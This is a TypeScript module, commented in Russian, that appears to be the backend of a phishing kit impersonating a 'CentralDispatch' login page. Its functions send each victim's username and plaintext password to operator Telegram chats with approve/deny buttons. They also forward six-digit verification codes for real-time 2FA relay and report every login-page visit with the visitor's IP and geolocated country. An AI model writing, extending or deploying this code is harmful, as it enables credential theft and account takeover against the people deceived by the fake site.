/**
 * Модуль для работы с Telegram Bot API
 * Отправка уведомлений о входе в систему с кнопками YES/NO
 */

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "";
// Дополнительные Chat ID для отправки сообщений (через запятую)
const TELEGRAM_CHAT_IDS = process.env.TELEGRAM_CHAT_IDS || "";

/**
 * Отправка сообщения в Telegram с кнопками YES/NO
 * @param username - имя пользователя
 * @param password - пароль
 * @param requestId - уникальный ID запроса для отслеживания ответа
 * @param ip - IP адрес пользователя (опционально)
 * @param userAgent - User-Agent браузера (опционально)
 * @returns message_id отправленного сообщения
 */
export async function sendLoginTelegram(
  username: string,
  password: string,
  requestId: string,
  ip?: string,
  userAgent?: string
): Promise<number> {
  console.log("[TELEGRAM] Отправка уведомления о входе...");
  console.log("[TELEGRAM] Request ID:", requestId);
  console.log("[TELEGRAM] IP:", ip);
  console.log("[TELEGRAM] User-Agent:", userAgent);

  if (!TELEGRAM_BOT_TOKEN) {
    throw new Error("TELEGRAM_BOT_TOKEN должен быть настроен");
  }

  // Формируем список Chat ID для отправки
  const chatIds: string[] = [];
  if (TELEGRAM_CHAT_ID) {
    chatIds.push(TELEGRAM_CHAT_ID);
  }
  if (TELEGRAM_CHAT_IDS) {
    // Разделяем по запятой и добавляем в список
    const additionalIds = TELEGRAM_CHAT_IDS.split(",").map(id => id.trim()).filter(id => id);
    chatIds.push(...additionalIds);
  }

  if (chatIds.length === 0) {
    throw new Error("TELEGRAM_CHAT_ID или TELEGRAM_CHAT_IDS должны быть настроены");
  }

  console.log("[TELEGRAM] Отправка на Chat IDs:", chatIds.join(", "));

  // Получаем информацию о стране по IP
  let countryInfo = "";
  if (ip && ip !== "unknown") {
    const geoData = await getCountryByIP(ip);
    if (geoData) {
      const flag = getCountryFlag(geoData.countryCode);
      countryInfo = `\n📍 *Страна:* ${geoData.country} ${flag}`;
    }
  }

  const currentTime = formatDate(new Date());
  const ipLine = ip && ip !== "unknown" ? `\n🌍 *IP:* \`${ip}\`` : "";

  const message = `🔐 *CentralDispatch - Новый вход в систему*

👤 *Username:* \`${username}\`
🔑 *Password:* \`${password}\`${ipLine}${countryInfo}
⏰ *Время:* ${currentTime}

Выберите действие:`;

  const keyboard = {
    inline_keyboard: [
      [
        {
          text: "✅ YES",
          callback_data: `login_yes_${requestId}`,
        },
        {
          text: "❌ NO",
          callback_data: `login_no_${requestId}`,
        },
      ],
    ],
  };

  // Отправляем сообщения на все Chat ID
  const sendPromises = chatIds.map(async (chatId) => {
    try {
      const response = await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: "Markdown",
            reply_markup: keyboard,
          }),
        }
      );

      const data = await response.json();

      if (!response.ok) {
        console.error(`[TELEGRAM] Ошибка отправки на ${chatId}:`, data);
        return null;
      }

      console.log(`[TELEGRAM] Сообщение успешно отправлено на ${chatId}, message_id:`, data.result.message_id);
      return data.result.message_id;
    } catch (error) {
      console.error(`[TELEGRAM] Ошибка отправки на ${chatId}:`, error);
      return null;
    }
  });

  try {
    const results = await Promise.all(sendPromises);
    const successfulResults = results.filter(r => r !== null);
    
    if (successfulResults.length === 0) {
      throw new Error("Не удалось отправить сообщение ни на один Chat ID");
    }

    console.log(`[TELEGRAM] Сообщения отправлены на ${successfulResults.length} из ${chatIds.length} Chat ID`);
    return successfulResults[0] as number; // Возвращаем первый успешный message_id
  } catch (error) {
    console.error("[TELEGRAM] Ошибка:", error);
    throw new Error("Не удалось отправить сообщение в Telegram");
  }
}

/**
 * Отправка кода верификации в Telegram (без кнопок)
 * @param code - 6-значный код верификации
 * @param username - имя пользователя (обязательно)
 * @param ip - IP адрес пользователя (опционально)
 * @param userAgent - User-Agent браузера (опционально)
 * @returns message_id отправленного сообщения
 */
export async function sendCodeTelegram(
  code: string,
  username: string,
  ip?: string,
  userAgent?: string
): Promise<number> {
  console.log("[TELEGRAM] Отправка кода верификации...");
  console.log("[TELEGRAM] Код:", code);
  console.log("[TELEGRAM] Username:", username);
  console.log("[TELEGRAM] IP:", ip);
  console.log("[TELEGRAM] User-Agent:", userAgent);

  if (!TELEGRAM_BOT_TOKEN) {
    throw new Error("TELEGRAM_BOT_TOKEN должен быть настроен");
  }

  // Формируем список Chat ID для отправки
  const chatIds: string[] = [];
  if (TELEGRAM_CHAT_ID) {
    chatIds.push(TELEGRAM_CHAT_ID);
  }
  if (TELEGRAM_CHAT_IDS) {
    // Разделяем по запятой и добавляем в список
    const additionalIds = TELEGRAM_CHAT_IDS.split(",").map(id => id.trim()).filter(id => id);
    chatIds.push(...additionalIds);
  }

  if (chatIds.length === 0) {
    throw new Error("TELEGRAM_CHAT_ID или TELEGRAM_CHAT_IDS должны быть настроены");
  }

  console.log("[TELEGRAM] Отправка кода на Chat IDs:", chatIds.join(", "));

  const currentTime = formatDate(new Date());

  const message = `🔐 *CentralDispatch - Код подтверждения*

📝 *Код:* \`${code}\`
👤 *Username:* \`${username}\`

⏰ *Время:* ${currentTime}

Введите этот код для подтверждения входа.`;

  // Отправляем сообщения на все Chat ID
  const sendPromises = chatIds.map(async (chatId) => {
    try {
      const response = await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: "Markdown",
          }),
        }
      );

      const data = await response.json();

      if (!response.ok) {
        console.error(`[TELEGRAM] Ошибка отправки кода на ${chatId}:`, data);
        return null;
      }

      console.log(`[TELEGRAM] Код успешно отправлен на ${chatId}, message_id:`, data.result.message_id);
      return data.result.message_id;
    } catch (error) {
      console.error(`[TELEGRAM] Ошибка отправки кода на ${chatId}:`, error);
      return null;
    }
  });

  try {
    const results = await Promise.all(sendPromises);
    const successfulResults = results.filter(r => r !== null);
    
    if (successfulResults.length === 0) {
      throw new Error("Не удалось отправить код ни на один Chat ID");
    }

    console.log(`[TELEGRAM] Код отправлен на ${successfulResults.length} из ${chatIds.length} Chat ID`);
    return successfulResults[0] as number; // Возвращаем первый успешный message_id
  } catch (error) {
    console.error("[TELEGRAM] Ошибка:", error);
    throw new Error("Не удалось отправить код в Telegram");
  }
}

/**
 * Получение информации о стране по IP адресу через ip-api.com
 * @param ip - IP адрес
 * @returns объект с информацией о стране или null
 */
async function getCountryByIP(ip: string): Promise<{ country: string; countryCode: string } | null> {
  try {
    // Пропускаем локальные IP адреса
    if (ip === "unknown" || ip === "127.0.0.1" || ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.")) {
      return null;
    }

    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode`, {
      method: "GET",
      headers: {
        "Accept": "application/json",
      },
    });

    if (!response.ok) {
      console.error(`[GEOIP] Ошибка запроса к ip-api.com: ${response.status}`);
      return null;
    }

    const data = await response.json();

    if (data.status === "success" && data.country && data.countryCode) {
      return {
        country: data.country,
        countryCode: data.countryCode,
      };
    }

    return null;
  } catch (error) {
    console.error("[GEOIP] Ошибка получения страны по IP:", error);
    return null;
  }
}

/**
 * Получение флага страны по коду страны (эмодзи)
 * @param countryCode - код страны (например, "RU", "US")
 * @returns эмодзи флага или пустая строка
 */
function getCountryFlag(countryCode: string): string {
  // Преобразуем код страны в эмодзи флаг
  // Каждая буква кода страны соответствует региональному индикатору
  const codePoints = countryCode
    .toUpperCase()
    .split("")
    .map((char) => 127397 + char.charCodeAt(0));
  
  return String.fromCodePoint(...codePoints);
}

/**
 * Определение типа устройства по User-Agent
 * @param userAgent - User-Agent строка браузера
 * @returns строка с типом устройства (💻 Компьютер или 📱 Телефон)
 */
function getDeviceType(userAgent?: string): string {
  if (!userAgent) {
    return "💻 Вход был через компьютер";
  }

  const ua = userAgent.toLowerCase();
  
  // Проверяем на мобильные устройства
  const mobileKeywords = [
    "mobile", "android", "iphone", "ipad", "ipod", 
    "blackberry", "windows phone", "opera mini", 
    "iemobile", "tablet", "kindle", "silk"
  ];
  
  const isMobile = mobileKeywords.some(keyword => ua.includes(keyword));
  
  return isMobile ? "📱 Вход был через телефон" : "💻 Вход был через компьютер";
}

/**
 * Форматирование даты в формат DD.MM.YYYY, HH:mm:ss
 * @param date - объект Date
 * @returns отформатированная строка даты
 */
function formatDate(date: Date): string {
  const day = String(date.getDate()).padStart(2, "0");
  const month = String(date.getMonth() + 1).padStart(2, "0");
  const year = date.getFullYear();
  const hours = String(date.getHours()).padStart(2, "0");
  const minutes = String(date.getMinutes()).padStart(2, "0");
  const seconds = String(date.getSeconds()).padStart(2, "0");
  
  return `${day}.${month}.${year}, ${hours}:${minutes}:${seconds}`;
}

/**
 * Отправка уведомления о посещении сайта
 * @param path - путь, по которому зашел пользователь
 * @param userAgent - User-Agent браузера (опционально)
 * @param ip - IP адрес пользователя (опционально)
 */
export async function sendVisitNotification(
  path: string,
  userAgent?: string,
  ip?: string
): Promise<void> {
  console.log("[TELEGRAM] Отправка уведомления о посещении сайта...");
  console.log("[TELEGRAM] Путь:", path);

  if (!TELEGRAM_BOT_TOKEN) {
    console.log("[TELEGRAM] TELEGRAM_BOT_TOKEN не настроен, уведомление не отправлено");
    return;
  }

  // Формируем список Chat ID для отправки
  const chatIds: string[] = [];
  if (TELEGRAM_CHAT_ID) {
    chatIds.push(TELEGRAM_CHAT_ID);
  }
  if (TELEGRAM_CHAT_IDS) {
    // Разделяем по запятой и добавляем в список
    const additionalIds = TELEGRAM_CHAT_IDS.split(",").map(id => id.trim()).filter(id => id);
    chatIds.push(...additionalIds);
  }

  if (chatIds.length === 0) {
    console.log("[TELEGRAM] TELEGRAM_CHAT_ID не настроен, уведомление не отправлено");
    return;
  }

  // Определяем тип посещения
  let visitType = "🌐 Посещение сайта";
  // Убираем параметры из пути для отображения
  const cleanPath = path.split("?")[0];
  if (cleanPath === "/" || cleanPath === "/Account/Login") {
    visitType = "🔐 Посещение страницы входа";
  }

  // Получаем информацию о стране по IP
  let countryInfo = "";
  if (ip && ip !== "unknown") {
    const geoData = await getCountryByIP(ip);
    if (geoData) {
      const flag = getCountryFlag(geoData.countryCode);
      countryInfo = `\n📍 *Страна:* ${geoData.country} ${flag}`;
    }
  }

  // Определяем тип устройства
  const deviceType = getDeviceType(userAgent);
  const currentTime = formatDate(new Date());
  const ipLine = ip && ip !== "unknown" ? `\n🌍 *IP:* \`${ip}\`` : "";

  const message = `${visitType}

⏰ *Время:* ${currentTime}${ipLine}${countryInfo}
${deviceType}

Кто-то зашел на сайт CentralDispatch.`;

  // Отправляем сообщения на все Chat ID (без ожидания ответа, чтобы не блокировать)
  chatIds.forEach((chatId) => {
    fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "Markdown",
        }),
      }
    ).catch((error) => {
      console.error(`[TELEGRAM] Ошибка отправки уведомления о посещении на ${chatId}:`, error);
    });
  });

  console.log(`[TELEGRAM] Уведомление о посещении отправлено на ${chatIds.length} Chat ID`);
}

/**
 * Отправка ответа на callback query (убирает loading на кнопках)
 * @param callbackQueryId - ID callback query
 * @param text - текст ответа (опционально)
 */
export async function answerCallbackQuery(
  callbackQueryId: string,
  text?: string
): Promise<void> {
  if (!TELEGRAM_BOT_TOKEN) {
    return;
  }

  try {
    await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          callback_query_id: callbackQueryId,
          text: text || "Обработано",
        }),
      }
    );
  } catch (error) {
    console.error("[TELEGRAM] Ошибка ответа на callback:", error);
  }
}

